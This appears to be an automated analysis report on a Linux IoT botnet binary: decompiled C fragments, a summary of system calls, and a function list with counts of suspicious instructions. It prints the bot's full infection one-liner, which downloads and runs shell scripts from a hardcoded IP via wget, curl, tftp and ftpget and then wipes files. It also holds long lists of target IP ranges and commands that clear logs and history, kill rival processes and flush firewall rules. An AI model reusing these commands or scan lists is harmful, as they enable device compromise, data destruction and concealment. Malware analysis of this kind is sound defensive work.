    char (*v60)[703] = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd / || busybox cd /tmp || busybox cd /var/run || busybox cd /mnt || busybox cd /root || busybox cd / || /bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; wget http://191.96.249.102/bitch.sh || curl http://191.96.249.102/bitch.sh; chmod 777 bitch.sh; sh bitch.sh; tftp 191.96.249.102 -c get voidtftp.sh; chmod 777 voidtftp.sh; sh voidtftp.sh; tftp -r voidtftp2.sh -g 191.96.249.102; chmod 777 voidtftp2.sh; sh voidtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 191.96.249.102 voidftp.sh voidftp.sh; sh voidftp.sh; rm -rf bitch.sh voidtftp.sh voidtftp2.sh voidftp.sh; rm -rf * \r\n";

        szprintf(v153, (int32_t)"112.5.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v154, (int32_t)"117.165.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v155, (int32_t)"85.3.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v156, (int32_t)"37.158.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v157, (int32_t)"95.9.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v158, (int32_t)"41.252.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v159, (int32_t)"58.71.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v160, (int32_t)"104.55.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v161, (int32_t)"78.186.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v162, (int32_t)"78.189.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v163, (int32_t)"221.120.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v164, (int32_t)"88.5.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v165, (int32_t)"41.254.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v166, (int32_t)"103.20.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v167, (int32_t)"103.47.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v168, (int32_t)"103.57.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v169, (int32_t)"45.117.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v170, (int32_t)"101.51.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v171, (int32_t)"137.59.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v172, (int32_t)"1.56.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v173, (int32_t)"1.188.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v174, (int32_t)"14.204.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v175, (int32_t)"27.0.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v176, (int32_t)"27.8.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v177, (int32_t)"27.50.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v178, (int32_t)"27.54.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v179, (int32_t)"27.98.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v180, (int32_t)"27.112.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v181, (int32_t)"27.192.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v182, (int32_t)"36.32.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v183, (int32_t)"36.248.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v184, (int32_t)"39.64.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v185, (int32_t)"42.4.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v186, (int32_t)"42.48.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v187, (int32_t)"42.52.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v188, (int32_t)"42.56.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v189, (int32_t)"42.63.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v190, (int32_t)"42.84.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v191, (int32_t)"42.176.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v192, (int32_t)"42.224.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v193, (int32_t)"42.176.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v194, (int32_t)"43.253.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v195, (int32_t)"43.230.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v196, (int32_t)"163.53.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v197, (int32_t)"43.230.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v198, (int32_t)"62.252.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v199, (int32_t)"43.245.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v200, (int32_t)"62.255.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v201, (int32_t)"123.25.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v202, (int32_t)"103.54.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v203, (int32_t)"27.255.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v204, (int32_t)"103.204.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v205, (int32_t)"123.24.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v206, (int32_t)"113.191.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v207, (int32_t)"81.100.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v208, (int32_t)"113.188.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v209, (int32_t)"113.189.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v210, (int32_t)"94.174.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v211, (int32_t)"14.160.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v212, (int32_t)"14.161.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v213, (int32_t)"14.162.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v214, (int32_t)"14.163.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v215, (int32_t)"14.164.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v216, (int32_t)"14.165.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v217, (int32_t)"14.166.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v218, (int32_t)"14.167.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v219, (int32_t)"14.168.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v220, (int32_t)"14.169.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v221, (int32_t)"14.170.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v222, (int32_t)"14.171.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v223, (int32_t)"14.172.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v224, (int32_t)"14.173.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v225, (int32_t)"14.174.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v226, (int32_t)"14.175.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v227, (int32_t)"14.176.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v228, (int32_t)"14.177.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v229, (int32_t)"14.178.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v230, (int32_t)"14.179.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v231, (int32_t)"14.180.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v232, (int32_t)"14.181.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v233, (int32_t)"14.182.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v234, (int32_t)"14.183.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v235, (int32_t)"14.184.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v236, (int32_t)"14.185.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v237, (int32_t)"14.186.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v238, (int32_t)"14.187.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v239, (int32_t)"14.188.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v240, (int32_t)"14.189.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v241, (int32_t)"14.190.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v242, (int32_t)"14.191.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v243, (int32_t)"45.121.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v244, (int32_t)"45.120.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v245, (int32_t)"45.115.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v246, (int32_t)"43.252.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v247, (int32_t)"43.230.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v248, (int32_t)"43.240.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v249, (int32_t)"43.245.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v250, (int32_t)"41.174.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v251, (int32_t)"49.118.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v252, (int32_t)"78.188.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v253, (int32_t)"45.127.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v254, (int32_t)"103.30.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v255, (int32_t)"14.33.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v256, (int32_t)"123.16.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v257, (int32_t)"202.44.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v258, (int32_t)"116.93.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v259, (int32_t)"91.83.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v260, (int32_t)"41.253.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v261, (int32_t)"117.173.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v262, (int32_t)"113.190.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v263, (int32_t)"146.88.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v264, (int32_t)"112.196.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v265, (int32_t)"113.178.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v266, (int32_t)"112.45.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v267, (int32_t)"183.223.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v268, (int32_t)"116.71.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v269, (int32_t)"103.44.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v270, (int32_t)"110.235.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v271, (int32_t)"124.253.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v272, (int32_t)"211.237.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v273, (int32_t)"117.175.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v274, (int32_t)"117.173.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v275, (int32_t)"178.93.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v276, (int32_t)"111.9.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v277, (int32_t)"222.252.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v278, (int32_t)"113.174.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v279, (int32_t)"222.252.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v280, (int32_t)"113.160.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v281, (int32_t)"113.161.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v282, (int32_t)"113.162.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v283, (int32_t)"113.163.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v284, (int32_t)"113.164.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v285, (int32_t)"113.165.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v286, (int32_t)"113.166.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v287, (int32_t)"113.167.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v288, (int32_t)"113.168.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v289, (int32_t)"113.169.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v290, (int32_t)"123.17.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v291, (int32_t)"123.18.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v292, (int32_t)"123.19.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v293, (int32_t)"123.20.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v294, (int32_t)"123.21.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v295, (int32_t)"123.22.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v296, (int32_t)"222.252.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v297, (int32_t)"222.253.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v298, (int32_t)"222.254.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v299, (int32_t)"222.255.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v300, (int32_t)"37.247.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v301, (int32_t)"41.208.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v302, (int32_t)"183.220.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v303, (int32_t)"175.201.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v304, (int32_t)"103.198.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v305, (int32_t)"183.223.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v306, (int32_t)"50.205.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v307, (int32_t)"88.248.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v308, (int32_t)"88.105.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v309, (int32_t)"88.247.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v310, (int32_t)"85.105.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v311, (int32_t)"188.3.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v312, (int32_t)"103.203.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v313, (int32_t)"103.55.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v314, (int32_t)"103.220.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v315, (int32_t)"183.233.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v316, (int32_t)"103.242.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v317, (int32_t)"103.198.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v318, (int32_t)"103.14.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v319, (int32_t)"103.195.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v320, (int32_t)"103.203.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v321, (int32_t)"103.214.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v322, (int32_t)"103.218.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v323, (int32_t)"103.225.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v324, (int32_t)"103.228.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v325, (int32_t)"103.231.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v326, (int32_t)"103.60.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v327, (int32_t)"103.248.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v328, (int32_t)"103.253.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v329, (int32_t)"103.255.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v330, (int32_t)"103.35.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v331, (int32_t)"103.49.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v332, (int32_t)"103.62.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v333, (int32_t)"144.48.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v334, (int32_t)"163.47.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v335, (int32_t)"163.53.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v336, (int32_t)"223.29.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v337, (int32_t)"59.153.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v338, (int32_t)"113.176.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v339, (int32_t)"113.175.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v340, (int32_t)"113.177.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v341, (int32_t)"113.183.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v342, (int32_t)"202.164.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v343, (int32_t)"203.134.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v344, (int32_t)"210.56.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v345, (int32_t)"49.156.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v346, (int32_t)"203.210.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v347, (int32_t)"117.181.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v348, (int32_t)"117.178.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v349, (int32_t)"117.177.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v350, (int32_t)"117.176.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v351, (int32_t)"117.170.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v352, (int32_t)"117.171.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v353, (int32_t)"117.162.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v353, (int32_t)"112.26.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v354, (int32_t)"112.27.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v355, (int32_t)"112.28.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v356, (int32_t)"112.29.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v357, (int32_t)"112.30.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v358, (int32_t)"112.31.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v359, (int32_t)"203.150.%d.%d", (int32_t)v140, (int32_t)v141);

        szprintf(v361, (int32_t)"50.233.%d.%d", (int32_t)v140, (int32_t)v141);

    szprintf(v148, (int32_t)"%d.%d.%d.%d", (int32_t)v149, (int32_t)v138);

        sprintf(v145, (int32_t)"%s cd /tmp || cd /var/run || cd /mnt || cd /root || cd / || busybox cd /tmp || busybox cd /var/run || busybox cd /mnt || busybox cd /root || busybox cd / || /bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; wget http://191.96.249.102/bitch.sh || curl http://191.96.249.102/bitch.sh ; chmod 777 bitch.sh; sh bitch.sh; tftp 191.96.249.102 -c get voidtftp.sh; chmod 777 voidtftp.sh; sh voidtftp.sh; tftp -r voidtftp2.sh -g 191.96.249.102; chmod 777 voidtftp2.sh; sh voidtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 191.96.249.102 voidftp.sh voidftp.sh; sh voidftp.sh; rm -rf bitch.sh voidtftp.sh voidtftp2.sh voidftp.sh; rm -rf * \r\n x00");

    return __libc_system((int32_t)"cd /tmp || cd /var/run || cd /mnt || cd /root || cd / || busybox cd /tmp || busybox cd /var/run || busybox cd /mnt || busybox cd /root || busybox cd / || /bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; wget http://191.96.249.102/bitch.sh || curl http://191.96.249.102/bitch.sh ; chmod 777 bitch.sh; sh bitch.sh; tftp 191.96.249.102 -c get voidtftp.sh; chmod 777 voidtftp.sh; sh voidtftp.sh; tftp -r voidtftp2.sh -g 191.96.249.102; chmod 777 voidtftp2.sh; sh voidtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 191.96.249.102 voidftp.sh voidftp.sh; sh voidftp.sh; rm -rf bitch.sh voidtftp.sh voidtftp2.sh voidftp.sh; rm -rf * \r\n");

        inet_addr((int32_t)"8.8.8.8");

================================================================================
========	SYSTEM CALLS SUMMARY : ================================================
================================================================================
    return __libc_system((int32_t)"cd /tmp || cd /var/run || cd /mnt || cd /root || cd / || busybox cd /tmp || busybox cd /var/run || busybox cd /mnt || busybox cd /root || busybox cd / || /bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; wget http://191.96.249.102/bitch.sh || curl http://191.96.249.102/bitch.sh ; chmod 777 bitch.sh; sh bitch.sh; tftp 191.96.249.102 -c get voidtftp.sh; chmod 777 voidtftp.sh; sh voidtftp.sh; tftp -r voidtftp2.sh -g 191.96.249.102; chmod 777 voidtftp2.sh; sh voidtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 191.96.249.102 voidftp.sh voidftp.sh; sh voidftp.sh; rm -rf bitch.sh voidtftp.sh voidtftp2.sh voidftp.sh; rm -rf * \r\n");

        __libc_system(v147);

        result = __libc_system(v154);

    __libc_system((int32_t)"rm -rf /tmp/* /var/* /var/run/* /var/tmp/*");

    __libc_system((int32_t)"rm -rf /var/log/wtmp");

    __libc_system((int32_t)"history -c;history -w");

    __libc_system((int32_t)"rm -rf /var/log/wtmp");

    __libc_system((int32_t)"rm -rf /tmp/*");

    __libc_system((int32_t)"history -c");

    __libc_system((int32_t)"rm -rf ~/.bash_history");

    __libc_system((int32_t)"rm -rf /bin/netstat");

    __libc_system((int32_t)"history -w");

    __libc_system((int32_t)"pkill -9 busybox");

    __libc_system((int32_t)"pkill -9 perl");

    __libc_system((int32_t)"service iptables stop");

    return __libc_system((int32_t)"/sbin/iptables -F;/sbin/iptables -X");

int32_t __libc_system(int32_t a1) {

================================================================================
========	FUNCTIONS LIST : =======================================================
================================================================================
FUNCTION_NAME                                     |ARGS|LENGH   |SUSPCET_INSTRC|WHILE_INSTRC|
----------------------------------------------------------------------------------------------
processCmd                                        |0   |10418   |968           |1736        |
----------------------------------------------------------------------------------------------
HackerScan2                                       |1   |1416    |215           |0           |
----------------------------------------------------------------------------------------------
sysconf                                           |1   |924     |136           |0           |
----------------------------------------------------------------------------------------------
__dns_lookup                                      |6   |1185    |73            |864         |
----------------------------------------------------------------------------------------------
main                                              |0   |697     |60            |462         |
----------------------------------------------------------------------------------------------
_fpmaxtostr                                       |0   |3465    |47            |3231        |
----------------------------------------------------------------------------------------------
fdpopen                                           |0   |473     |38            |0           |
----------------------------------------------------------------------------------------------
_init                                             |0   |776     |35            |0           |
----------------------------------------------------------------------------------------------
gethostbyname_r                                   |8   |566     |33            |0           |
----------------------------------------------------------------------------------------------
sendTCP                                           |7   |466     |32            |179         |
----------------------------------------------------------------------------------------------
StartTheLelz                                      |1   |733     |30            |573         |
----------------------------------------------------------------------------------------------
malloc                                            |1   |3702    |30            |2310        |
----------------------------------------------------------------------------------------------
__read_etc_hosts_r                                |9   |635     |28            |243         |
----------------------------------------------------------------------------------------------
prints                                            |4   |491     |28            |28          |
----------------------------------------------------------------------------------------------
sendUDP                                           |6   |337     |26            |66          |
----------------------------------------------------------------------------------------------
__open_nameservers                                |0   |536     |23            |326         |
----------------------------------------------------------------------------------------------
_ppfs_parsespec                                   |1   |1088    |20            |921         |
----------------------------------------------------------------------------------------------
getOurIP                                          |0   |269     |17            |80          |
----------------------------------------------------------------------------------------------
sendJUNK                                          |3   |317     |13            |141         |
----------------------------------------------------------------------------------------------
RemoveTMP                                         |0   |156     |13            |0           |
----------------------------------------------------------------------------------------------
sendHOLD                                          |3   |294     |11            |122         |
----------------------------------------------------------------------------------------------
_stdio_fopen                                      |4   |1031    |11            |0           |
----------------------------------------------------------------------------------------------
getBogos                                          |1   |213     |10            |58          |
----------------------------------------------------------------------------------------------
print                                             |3   |452     |10            |288         |
----------------------------------------------------------------------------------------------
getCores                                          |0   |165     |9             |0           |
----------------------------------------------------------------------------------------------
__uClibc_main                                     |8   |720     |9             |19          |
----------------------------------------------------------------------------------------------
__GI_inet_ntop                                    |4   |520     |8             |348         |
----------------------------------------------------------------------------------------------
sendHTTP                                          |6   |195     |8             |38          |
----------------------------------------------------------------------------------------------
sendCNC                                           |3   |167     |7             |0           |
----------------------------------------------------------------------------------------------
negotiate                                         |3   |198     |7             |0           |
----------------------------------------------------------------------------------------------
sendSTD                                           |3   |184     |7             |26          |
----------------------------------------------------------------------------------------------
fdpclose                                          |0   |198     |6             |24          |
----------------------------------------------------------------------------------------------
sleep                                             |1   |244     |6             |94          |
----------------------------------------------------------------------------------------------
NetisRanges                                       |1   |154     |6             |0           |
----------------------------------------------------------------------------------------------
recvLine                                          |0   |265     |6             |83          |
----------------------------------------------------------------------------------------------
memrchr                                           |3   |320     |6             |124         |
----------------------------------------------------------------------------------------------
StartTheNetis                                     |0   |158     |5             |9           |
----------------------------------------------------------------------------------------------
printi                                            |1   |244     |5             |23          |
----------------------------------------------------------------------------------------------
inet_pton                                         |4   |443     |5             |253         |
----------------------------------------------------------------------------------------------
srandom_r                                         |2   |223     |5             |35          |
----------------------------------------------------------------------------------------------
readUntil                                         |8   |240     |4             |88          |
----------------------------------------------------------------------------------------------
socket_connect                                    |2   |174     |4             |0           |
----------------------------------------------------------------------------------------------
strstr                                            |2   |280     |4             |119         |
----------------------------------------------------------------------------------------------
_stdlib_strto_l                                   |4   |541     |4             |91          |
----------------------------------------------------------------------------------------------
botkiller                                         |0   |174     |4             |0           |
----------------------------------------------------------------------------------------------
abort                                             |0   |221     |4             |75          |
----------------------------------------------------------------------------------------------
listFork                                          |0   |174     |3             |17          |
----------------------------------------------------------------------------------------------
hostname_to_ip                                    |2   |164     |3             |0           |
----------------------------------------------------------------------------------------------
connectTimeout                                    |4   |201     |3             |0           |
----------------------------------------------------------------------------------------------
HackerPrint                                       |2   |152     |3             |0           |
----------------------------------------------------------------------------------------------
__GI_fclose                                       |1   |199     |3             |0           |
----------------------------------------------------------------------------------------------
fflush_unlocked                                   |1   |249     |3             |59          |
----------------------------------------------------------------------------------------------
initConnection                                    |0   |177     |3             |0           |
----------------------------------------------------------------------------------------------
__GI_strpbrk                                      |4   |206     |2             |49          |
----------------------------------------------------------------------------------------------
__GI_vfprintf                                     |4   |195     |2             |0           |
----------------------------------------------------------------------------------------------
__libc_system                                     |1   |190     |2             |0           |
----------------------------------------------------------------------------------------------
_uintmaxtostr                                     |5   |244     |2             |34          |
----------------------------------------------------------------------------------------------
_vfprintf_internal                                |4   |824     |2             |661         |
----------------------------------------------------------------------------------------------
__GI_herror                                       |1   |179     |2             |0           |
----------------------------------------------------------------------------------------------
inet_aton                                         |2   |249     |2             |94          |
----------------------------------------------------------------------------------------------
_stdio_term                                       |0   |195     |2             |31          |
----------------------------------------------------------------------------------------------
__decode_dotted                                   |4   |238     |2             |71          |
----------------------------------------------------------------------------------------------
trim                                              |0   |205     |2             |56          |
----------------------------------------------------------------------------------------------
__GI_initstate_r                                  |4   |182     |2             |0           |
----------------------------------------------------------------------------------------------
makeRandomStr                                     |2   |158     |2             |0           |
----------------------------------------------------------------------------------------------
_stdio_openlist_dec_use                           |0   |213     |2             |37          |
----------------------------------------------------------------------------------------------
__open_etc_hosts                                  |0   |154     |2             |0           |
----------------------------------------------------------------------------------------------
strcasestr                                        |2   |215     |2             |61          |
----------------------------------------------------------------------------------------------
contains_string                                   |2   |177     |2             |16          |
----------------------------------------------------------------------------------------------
__GI_strspn                                       |4   |199     |2             |45          |
----------------------------------------------------------------------------------------------
matchPrompt                                       |1   |201     |2             |52          |
----------------------------------------------------------------------------------------------
__malloc_consolidate                              |1   |290     |2             |122         |
----------------------------------------------------------------------------------------------
__stdio_WRITE                                     |4   |224     |2             |74          |
----------------------------------------------------------------------------------------------
__GI_sigprocmask                                  |4   |181     |2             |0           |
----------------------------------------------------------------------------------------------
__GI_fgets_unlocked                               |4   |222     |2             |60          |
----------------------------------------------------------------------------------------------
rawmemchr                                         |4   |237     |2             |25          |
----------------------------------------------------------------------------------------------
kill                                              |2   |156     |1             |0           |
----------------------------------------------------------------------------------------------
_ppfs_setargs                                     |1   |320     |1             |80          |
----------------------------------------------------------------------------------------------
__GI_strcasecmp                                   |4   |174     |1             |28          |
----------------------------------------------------------------------------------------------
_fini                                             |0   |146     |1             |0           |
----------------------------------------------------------------------------------------------
getdtablesize                                     |1   |151     |1             |0           |
----------------------------------------------------------------------------------------------
__vfork                                           |1   |145     |1             |0           |
----------------------------------------------------------------------------------------------
get_telstate_host                                 |0   |145     |1             |0           |
